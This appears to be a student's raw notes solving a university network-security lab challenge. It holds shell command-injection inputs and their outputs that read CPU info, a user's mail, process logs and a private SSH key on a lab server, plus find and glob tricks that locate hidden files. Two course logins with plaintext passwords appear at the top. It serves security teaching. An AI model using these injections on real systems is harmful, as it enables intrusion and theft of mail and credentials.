@@ -1,0 +1,65 @@
+bash
+w
+python /courses/InetSec1/challenge3/.client
+>>inetsec007:WqKpRVP0
+
+
+>>inetsec247:BQn&FXiz6
+
+nc 10.10.1.15 5000
+
+1. What is the cache size of the CPU on the vulnerable server in KB?
+.;cat /proc/cpuinfo
+cache size	: 6144 KB
+
+2. What is the secret code in one of the e-mails in the INBOX of the user cracker?
+.; cat /var/mail/cracker
+
+73110811051211027855757285805410
+
+3. What is the process ID in the logs of the process secretprocess?
+.; cat /var/log/somesecretprocess.log
+
+731101177146105511226997105909910
+
+
+4. What is the private SSH key of the user stupiduser?
+
+X; cd /home/stupiduser/.ssh/;cat id_dsa
+
+731104953837611776518010410311510
+
+5. What is the message in the secret file (i.e., topsecret.txt) somewhere in the root directory?
+
+;vdir /home
+find / -name topsecret.txt
+
+>>dir /.[!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(]
+topsecret.txt
+
+
+>>find /.[!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(]
+/.supersecretdir
+/.supersecretdir/topsecret.txt
+
+
+>>cat /.supersecretdir/topsecret.txt
+I like work, it fascinates me. I can sit and look at it for hours.
+
+
+Sorry, I could not find that!
+
+6. Watch the video/movie that is in the home directory of one of the users. What should you remember? ;-)
+find /home/.[!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(][!\(]
+
+/home/.suspended_user/movie.m4v
+
+
+>>base64 /home/.suspended_user/movie.m4v
+
+-> file.py ndern, so dass es speichert
+
+File ziehen:
+
+simon@Cottonmouth:~$ ssh -p 10001 inetsec007@128.130.60.30 cat today.mp4 > video.mp4
+
